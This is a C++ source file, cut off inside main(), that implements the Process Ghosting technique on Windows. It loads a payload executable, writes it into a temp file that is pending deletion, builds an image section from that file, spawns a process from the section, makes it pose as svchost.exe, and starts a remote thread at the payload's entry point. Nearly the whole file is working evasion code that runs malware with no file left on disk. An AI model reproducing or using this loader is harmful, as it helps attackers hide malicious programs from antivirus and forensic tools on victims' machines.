#include <stdio.h>
#include <Windows.h>
#include <iostream>

#ifndef _APISETMAP_H_
#define _APISETMAP_H_
#endif

#define STATUS_IMAGE_NOT_AT_BASE 0x40000003
#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define PS_INHERIT_HANDLES          4
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)
#define STATUS_SUCCESS 0
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_OVERWRITE_IF 0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define RTL_MAX_DRIVE_LETTERS 32
typedef LONG KPRIORITY;
typedef long NTSTATUS;



#ifndef FILE_SUPERSEDED
#define FILE_SUPERSEDED                 0x00000000
#define FILE_OPENED                     0x00000001
#define FILE_CREATED                    0x00000002
#define FILE_OVERWRITTEN                0x00000003
#define FILE_EXISTS                     0x00000004
#define FILE_DOES_NOT_EXIST             0x00000005
#endif

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }



typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  pBuffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _WIN_VER_INFO {
	WCHAR chOSMajorMinor[8];
	DWORD dwBuildNumber;
	UNICODE_STRING ProcName;
	HANDLE hTargetPID;
	LPCSTR lpApiCall;
	INT SystemCall;
} WIN_VER_INFO, * PWIN_VER_INFO;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESSES {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		LONG Status;
		PVOID Pointer;
	};
	ULONG Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


typedef FARPROC(WINAPI* _GetProcAddress)(
	HMODULE hModule,
	LPCSTR  lpProcName
	);

typedef LPVOID(WINAPI* _VirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

typedef BOOL(WINAPI* _VirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
	);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef NTSTATUS(NTAPI* _RtlGetVersion)(
	LPOSVERSIONINFOEXW lpVersionInformation
	);

typedef void (WINAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);


typedef NTSYSAPI BOOLEAN(NTAPI* _RtlEqualUnicodeString)(
	PUNICODE_STRING String1,
	PCUNICODE_STRING String2,
	BOOLEAN CaseInSensitive
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _ZwQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtFreeVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	ULONG FreeType
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(
	PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER AllocationSize,
	ULONG FileAttributes,
	ULONG ShareAccess,
	ULONG CreateDisposition,
	ULONG CreateOptions,
	PVOID EaBuffer,
	ULONG EaLength
	);



typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenFile)(
	OUT PHANDLE FileHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG ShareAccess,
	IN ULONG OpenOptions
	);


typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryInformationProcess)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL);


typedef NTSYSAPI NTSTATUS(NTAPI* _NtReadVirtualMemory)(
	_In_		HANDLE ProcessHandle,
	_In_opt_	PVOID BaseAddress,
	_Out_		PVOID Buffer,
	_In_		SIZE_T BufferSize,
	_Out_opt_	PSIZE_T NumberOfBytesRead
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _ZwClose)(
	IN HANDLE KeyHandle
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateProcessEx)
(
	PHANDLE				ProcessHandle,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes  OPTIONAL,
	HANDLE				ParentProcess,
	ULONG				Flags,
	HANDLE				SectionHandle     OPTIONAL,
	HANDLE				DebugPort     OPTIONAL,
	HANDLE				ExceptionPort     OPTIONAL,
	BOOLEAN				InJob
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateTransaction)
(
	PHANDLE            TransactionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	LPGUID             Uow,
	HANDLE             TmHandle,
	ULONG              CreateOptions,
	ULONG              IsolationLevel,
	ULONG              IsolationFlags,
	PLARGE_INTEGER     Timeout,
	PUNICODE_STRING    Description
	);


typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateSection)
(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG SectionPageProtection,
	ULONG AllocationAttributes,
	HANDLE FileHandle
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtRollbackTransaction)(
	_In_ HANDLE  TransactionHandle,
	_In_ BOOLEAN Wait);

typedef NTSYSAPI PIMAGE_NT_HEADERS(NTAPI* _RtlImageNTHeader)(
	_In_ PVOID Base
	);

typedef NTSYSAPI NTSTATUS(NTAPI* _ZwOpenProcess)(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
	);
typedef HANDLE(WINAPI* _OpenProcess)(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
	);



typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(
	_Out_ PHANDLE hThread,
	_In_  ACCESS_MASK DesiredAccess,
	_In_  LPVOID ObjectAttributes,
	_In_  HANDLE ProcessHandle,
	_In_  LPTHREAD_START_ROUTINE lpStartAddress,
	_In_  LPVOID lpParameter,
	_In_  BOOL CreateSuspended,
	_In_  DWORD StackZeroBits,
	_In_  DWORD SizeOfStackCommit,
	_In_  DWORD SizeOfStackReserve,
	_Out_ LPVOID lpBytesBuffer);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
	_In_        HANDLE ProcessHandle,
	_In_opt_    PVOID BaseAddress,
	_In_        VOID* Buffer,
	_In_        SIZE_T BufferSize,
	_Out_opt_   PSIZE_T NumberOfBytesWritten
	);

// PBI
typedef struct _PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
	USHORT                  Flags;
	USHORT                  Length;
	ULONG                   TimeStamp;
	UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;
} CURDIR, * PCURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG EnvironmentSize;
	ULONG EnvironmentVersion;
	PVOID PackageDependencyData; //8+
	ULONG ProcessGroupId;
	// ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef
VOID
(NTAPI* PPS_POST_PROCESS_INIT_ROUTINE) (
	VOID
	);

typedef struct _PEB_FREE_BLOCK {
	_PEB_FREE_BLOCK* Next;
	ULONG                   Size;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;


typedef void (*PPEBLOCKROUTINE)(
	PVOID PebLock
	);

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBaseAddress;
	PPEB_LDR_DATA           LoaderData;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PPEBLOCKROUTINE         FastPebLockRoutine;
	PPEBLOCKROUTINE         FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PPEB_FREE_BLOCK         FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;
typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PPEB PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;


typedef NTSYSAPI NTSTATUS(NTAPI* _RtlCreateProcessParametersEx)(
	_Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags);

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;


typedef NTSYSAPI NTSTATUS(NTAPI* _NtMapViewOfSection)(
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN SIZE_T CommitSize,
	IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
	IN OUT PSIZE_T ViewSize,
	IN SECTION_INHERIT InheritDisposition,
	IN ULONG AllocationType,
	IN ULONG Protect
	);



typedef enum _FILE_INFORMATION_CLASS
{
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,   // 2
	FileBothDirectoryInformation,   // 3
	FileBasicInformation,           // 4  wdm
	FileStandardInformation,        // 5  wdm
	FileInternalInformation,        // 6
	FileEaInformation,              // 7
	FileAccessInformation,          // 8
	FileNameInformation,            // 9
	FileRenameInformation,          // 10
	FileLinkInformation,            // 11
	FileNamesInformation,           // 12
	FileDispositionInformation,     // 13
	FilePositionInformation,        // 14 wdm
	FileFullEaInformation,          // 15
	FileModeInformation,            // 16
	FileAlignmentInformation,       // 17
	FileAllInformation,             // 18
	FileAllocationInformation,      // 19
	FileEndOfFileInformation,       // 20 wdm
	FileAlternateNameInformation,   // 21
	FileStreamInformation,          // 22
	FilePipeInformation,            // 23
	FilePipeLocalInformation,       // 24
	FilePipeRemoteInformation,      // 25
	FileMailslotQueryInformation,   // 26
	FileMailslotSetInformation,     // 27
	FileCompressionInformation,     // 28
	FileObjectIdInformation,        // 29
	FileCompletionInformation,      // 30
	FileMoveClusterInformation,     // 31
	FileQuotaInformation,           // 32
	FileReparsePointInformation,    // 33
	FileNetworkOpenInformation,     // 34
	FileAttributeTagInformation,    // 35
	FileTrackingInformation,        // 36
	FileIdBothDirectoryInformation, // 37
	FileIdFullDirectoryInformation, // 38
	FileValidDataLengthInformation, // 39
	FileShortNameInformation,       // 40
	FileIoCompletionNotificationInformation, // 41
	FileIoStatusBlockRangeInformation,       // 42
	FileIoPriorityHintInformation,           // 43
	FileSfioReserveInformation,              // 44
	FileSfioVolumeInformation,               // 45
	FileHardLinkInformation,                 // 46
	FileProcessIdsUsingFileInformation,      // 47
	FileMaximumInformation                   // 48
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef struct _FILE_DISPOSITION_INFORMATION {
	BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, * PFILE_DISPOSITION_INFORMATION;


typedef NTSYSAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
	IN HANDLE FileHandle,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass
	);

BYTE* LoadExecutableBuffer(OUT size_t& bufferSize) {
	HANDLE fileHandle = CreateFileW(L"E:\\My Directory\\PE-DATA\\Process_Ghosting\\x64\\Release\\injected.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to open executable file... \n");
		exit(-1);
	}
	bufferSize = GetFileSize(fileHandle, 0);
	BYTE* allocatedBuffer = (BYTE*)VirtualAlloc(0, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (allocatedBuffer == NULL) {
		perror("[-] Failed to allocate memory for executable buffer... \n");
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(fileHandle, allocatedBuffer, bufferSize, &bytesRead, NULL)) {
		perror("[-] Failed to read executable buffer... \n");
		exit(-1);
	}
	CloseHandle(fileHandle);
	return allocatedBuffer;
}


HANDLE CreateSectionFromPendingDeletion(wchar_t* filePath, BYTE* dataBuffer, size_t bufferSize) {
	HANDLE fileHandle;
	HANDLE sectionHandle;
	NTSTATUS ntStatus;
	_OBJECT_ATTRIBUTES objectAttributes;
	UNICODE_STRING unicodeFilePath;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	DWORD bytesWritten;

	// NT Functions Declaration
	_NtOpenFile fnNtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
	if (fnNtOpenFile == NULL) {
		perror("[-] Failed to locate NtOpenFile API...\n");
		exit(-1);
	}
	_RtlInitUnicodeString fnRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (fnRtlInitUnicodeString == NULL) {
		perror("[-] Failed to locate RtlInitUnicodeString API...\n");
		exit(-1);
	}
	_NtSetInformationFile fnNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
	if (fnNtSetInformationFile == NULL) {
		perror("[-] Failed to locate NtSetInformationFile API...\n");
		exit(-1);
	}
	_NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	if (fnNtCreateSection == NULL) {
		perror("[-] Failed to locate NtCreateSection API...\n");
		exit(-1);
	}

	fnRtlInitUnicodeString(&unicodeFilePath, filePath);
	InitializeObjectAttributes(&objectAttributes, &unicodeFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	wprintf(L"[+] Attempting to open the file...\n");

	// Open File
	ntStatus = fnNtOpenFile(&fileHandle, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		&objectAttributes, &ioStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to open the file...\n");
		exit(-1);
	}

	wprintf(L"[+] Setting file to delete-pending state...\n");
	// Set disposition flag
	FILE_DISPOSITION_INFORMATION fileDisposition = { 0 };
	fileDisposition.DeleteFile = TRUE;

	ntStatus = fnNtSetInformationFile(fileHandle, &ioStatusBlock, &fileDisposition, sizeof(fileDisposition), FileDispositionInformation);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to set file to delete-pending state...\n");
		exit(-1);
	}

	wprintf(L"[+] Writing data to delete-pending file...\n");
	// Write Payload To File
	if (!WriteFile(fileHandle, dataBuffer, bufferSize, &bytesWritten, NULL)) {
		perror("[-] Failed to write data to the file...\n");
		exit(-1);
	}

	wprintf(L"[+] Creating section from delete-pending file...\n");
	ntStatus = fnNtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, fileHandle);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to create section from delete-pending file...\n");
		exit(-1);
	}
	wprintf(L"[+] Section successfully created from delete-pending file.\n");

	// Close the delete-pending file handle
	CloseHandle(fileHandle);
	fileHandle = NULL;
	wprintf(L"[-] File successfully deleted from disk...\n");

	return sectionHandle;
}


HANDLE LaunchProcessFromSection(HANDLE sectionHandle) {
	HANDLE processHandle = INVALID_HANDLE_VALUE;
	NTSTATUS ntStatus;
	_NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");

	if (fnNtCreateProcessEx == NULL) {
		perror("[-] Failed to locate NtCreateProcessEx API...\n");
		exit(-1);
	}

	// Create Process with File-less Section
	ntStatus = fnNtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL,
		GetCurrentProcess(), PS_INHERIT_HANDLES, sectionHandle, NULL, NULL, FALSE);

	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to create the process...\n");
		exit(-1);
	}

	return processHandle;
}


ULONG_PTR RetrieveEntryPoint(HANDLE processHandle, BYTE* payloadBuffer, PROCESS_BASIC_INFORMATION processInfo) {
	BYTE imageBuffer[0x1000];
	ULONG_PTR entryPointAddress;
	SIZE_T bytesRead;
	NTSTATUS ntStatus;

	ZeroMemory(imageBuffer, sizeof(imageBuffer));

	// Function Declarations
	_RtlImageNTHeader fnRtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	if (fnRtlImageNTHeader == NULL) {
		perror("[-] Failed to locate RtlImageNtHeader API...\n");
		exit(-1);
	}
	_NtReadVirtualMemory fnNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	if (fnNtReadVirtualMemory == NULL) {
		perror("[-] Failed to locate NtReadVirtualMemory API...\n");
		exit(-1);
	}

	ntStatus = fnNtReadVirtualMemory(processHandle, processInfo.PebBaseAddress, &imageBuffer, sizeof(imageBuffer), &bytesRead);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to read remote process PEB base address...\n");
		exit(-1);
	}
	wprintf(L"[+] PEB Base Address of the target process: %p \n", (ULONG_PTR)((PPEB)imageBuffer)->ImageBaseAddress);

	entryPointAddress = (fnRtlImageNTHeader(payloadBuffer)->OptionalHeader.AddressOfEntryPoint);
	entryPointAddress += (ULONG_PTR)((PPEB)imageBuffer)->ImageBaseAddress;

	wprintf(L"[+] Calculated EntryPoint of the payload buffer: %p \n", entryPointAddress);

	return entryPointAddress;
}



BOOL ExecuteGhostProcess(BYTE* shellcode, size_t shellcodeSize) {
	NTSTATUS ntStatus;

	_NtQueryInformationProcess pQueryProcessInfo = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pQueryProcessInfo == NULL) {
		perror("[-] Failed to resolve NtQueryInformationProcess API.\n");
		exit(-1);
	}

	_RtlInitUnicodeString pInitUnicodeStr = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (pInitUnicodeStr == NULL) {
		perror("[-] Failed to resolve RtlInitUnicodeString API.\n");
		exit(-1);
	}

	_NtCreateThreadEx pCreateRemoteThread = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	if (pCreateRemoteThread == NULL) {
		perror("[-] Failed to resolve NtCreateThreadEx API.\n");
		exit(-1);
	}

	_NtWriteVirtualMemory pWriteMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (pWriteMemory == NULL) {
		perror("[-] Failed to resolve NtWriteVirtualMemory API.\n");
		exit(-1);
	}

	_NtAllocateVirtualMemory pAllocMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	if (pAllocMemory == NULL) {
		perror("[-] Failed to resolve NtAllocateVirtualMemory API.\n");
		exit(-1);
	}

	_RtlCreateProcessParametersEx pCreateProcParams = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	if (pCreateProcParams == NULL) {
		perror("[-] Failed to resolve RtlCreateProcessParametersEx API.\n");
		exit(-1);
	}

	HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
	HANDLE hMemorySection = INVALID_HANDLE_VALUE;
	DWORD procInfoLength;
	PROCESS_BASIC_INFORMATION procBasicInfo;
	ULONG_PTR epAddress;
	UNICODE_STRING unicodeTargetFile;
	PRTL_USER_PROCESS_PARAMETERS procParams;
	PEB* pRemotePEB;
	HANDLE hRemoteThread;
	UNICODE_STRING unicodeDllPath;
	wchar_t ntPath[MAX_PATH] = L"\\??\\";
	wchar_t tempFile[MAX_PATH] = { 0 };
	wchar_t tempDir[MAX_PATH] = { 0 };

	GetTempPathW(MAX_PATH, tempDir);
	GetTempFileNameW(tempDir, L"Panda", 0, tempFile);
	lstrcat(ntPath, tempFile);

	hMemorySection = CreateSectionFromPendingDeletion(ntPath, shellcode, shellcodeSize);
	if (hMemorySection == INVALID_HANDLE_VALUE) {
		perror("[-] Failed to create memory section.\n");
		exit(-1);
	}

	hTargetProcess = LaunchProcessFromSection(hMemorySection);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		perror("[-] Failed to create ghosted process.\n");
		exit(-1);
	}

	wprintf(L"[+] Ghosted process created successfully.\n");

	// Retrieve process information
	ntStatus = pQueryProcessInfo(hTargetProcess, ProcessBasicInformation, &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &procInfoLength);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to retrieve process information.\n");
		exit(-1);
	}

	// Retrieve entry point
	epAddress = RetrieveEntryPoint(hTargetProcess, shellcode, procBasicInfo);

	WCHAR targetPath[MAX_PATH];
	lstrcpyW(targetPath, L"C:\\windows\\system32\\svchost.exe");
	pInitUnicodeStr(&unicodeTargetFile, targetPath);

	// Create and configure process parameters
	wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING unicodeDllDir = { 0 };
	pInitUnicodeStr(&unicodeDllPath, dllDir);

	ntStatus = pCreateProcParams(&procParams, &unicodeTargetFile, &unicodeDllPath, NULL,
		&unicodeTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to create process parameters.\n");
		exit(-1);
	}

	// Allocate memory for process parameters in target process
	PVOID paramBuffer = procParams;
	SIZE_T paramSize = procParams->EnvironmentSize + procParams->MaximumLength;
	ntStatus = pAllocMemory(hTargetProcess, &paramBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to allocate memory for process parameters.\n");
		exit(-1);
	}

	printf("[+] Allocated memory for process parameters at %p.\n", paramBuffer);

	// Write process parameters into the target process
	ntStatus = pWriteMemory(hTargetProcess, procParams, procParams, procParams->EnvironmentSize + procParams->MaximumLength, NULL);

	pRemotePEB = (PEB*)procBasicInfo.PebBaseAddress;

	// Update the address of the process parameters in the target process's PEB
	if (!WriteProcessMemory(hTargetProcess, &pRemotePEB->ProcessParameters, &procParams, sizeof(PVOID), NULL)) {
		perror("[-] Failed to update process parameters in the target PEB.\n");
		exit(-1);
	}

	printf("[+] Updated process parameters address in the remote PEB.\n");

	// Create the thread to execute the ghosted process
	ntStatus = pCreateRemoteThread(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hTargetProcess,
		(LPTHREAD_START_ROUTINE)epAddress, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		std::cerr << "[-] Failed to create remote thread. NTSTATUS: " << std::hex << ntStatus << std::endl;
		exit(-1);
	}

	printf("[+] Remote thread created and executed.\n");

	return TRUE;
}


int main() {
	size_t bufferSize = 0;
	BYTE* buffer = LoadExecutableBuffer(bufferSize);
